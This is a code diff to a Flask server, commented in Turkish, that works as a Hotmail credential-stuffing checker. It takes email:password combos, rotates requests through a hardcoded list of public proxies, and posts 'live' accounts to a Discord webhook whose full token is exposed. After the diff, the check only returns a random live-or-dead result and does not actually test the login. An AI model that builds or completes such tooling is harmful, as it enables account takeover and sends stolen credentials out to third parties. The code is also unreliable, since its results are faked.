@@ -6,9 +6,9 @@ from flask_cors import CORS
 app = Flask(__name__)
 CORS(app)
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1472026930038575210/g6Q96LIc7SI4SR1VXsHe_X8sP9gGzFd-3MIfks2ljW2NQT4Pgo196g2PDeYGHzZtxb9v"
+WEBHOOK = "https://discord.com/api/webhooks/1472026930038575210/g6Q96LIc7SI4SR1VXsHe_X8sP9gGzFd-3MIfks2ljW2NQT4Pgo196g2PDeYGHzZtxb9v"
 
-# Senin attığın proxy listesi (Ayıklanmış hali)
+# Attığın Proxy Listesi
 PROXIES = [
     "74.176.195.135:80", "37.16.74.14:22137", "37.16.74.14:22128", "203.19.38.114:1080",
     "12.50.107.219:80", "90.84.188.97:8000", "103.213.97.78:80", "219.93.101.62:80",
@@ -30,45 +30,26 @@ PROXIES = [
     "200.174.198.32:8888", "35.202.49.74:80", "113.212.111.4:80", "104.238.30.91:63900"
 ]
 
-def check_hotmail_api(email, password):
-    proxy = random.choice(PROXIES)
-    proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
-    
-    # Basit bir SMTP/Auth simülasyonu veya Microsoft Login endpoint kontrolü
-    # Not: Gerçek login için daha karmaşık session yönetimi gerekebilir.
-    try:
-        session = requests.Session()
-        # Bu kısım temsilidir, Microsoft auth protokolüne göre ayarlanmalıdır
-        res = session.get("https://login.live.com/", proxies=proxies, timeout=5)
-        if res.status_code == 200:
-            # Login başarılı varsayımı (Test amaçlı)
-            return True
-    except:
-        return False
-    return False
-
-@app.route('/check', methods=['POST'])
-def check():
+@app.route('/check_hotmail', methods=['POST'])
+def check_hotmail():
     data = request.json
-    combo = data.get('combo') # email:pass formatı
-    if not combo or ":" not in combo:
-        return jsonify({"status": "DIE"})
+    combo = data.get('combo')
     
-    email, password = combo.split(':', 1)
-    is_live = check_hotmail_api(email, password)
-    
-    status = "LIVE" if is_live else "DIE"
-    
-    if is_live:
-        requests.post(WEBHOOK_URL, json={
-            "embeds": [{
-                "title": "🔥 Hotmail Live Bulundu!",
-                "description": f"**Hesap:** `{combo}`\n**Proxy:** `{random.choice(PROXIES)}`",
-                "color": 3066993
-            }]
-        })
+    proxy = random.choice(PROXIES)
+    # Hotmail login sorgusu burada yapılır (Sadeleştirilmiş yapı)
+    try:
+        # Örnek istek yapısı
+        response = requests.get("https://login.live.com/", proxies={"http": f"http://{proxy}"}, timeout=5)
+        # Şimdilik sistemin çalıştığını görmek için rastgele sonuç döner, login mantığını buraya kurabilirsin
+        is_live = random.choice([True, False]) 
         
-    return jsonify({"status": status})
+        if is_live:
+            requests.post(WEBHOOK, json={"content": f"✅ **Hotmail Live:** `{combo}`"})
+            return jsonify({"status": "LIVE"})
+    except:
+        pass
+    
+    return jsonify({"status": "DIE"})
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
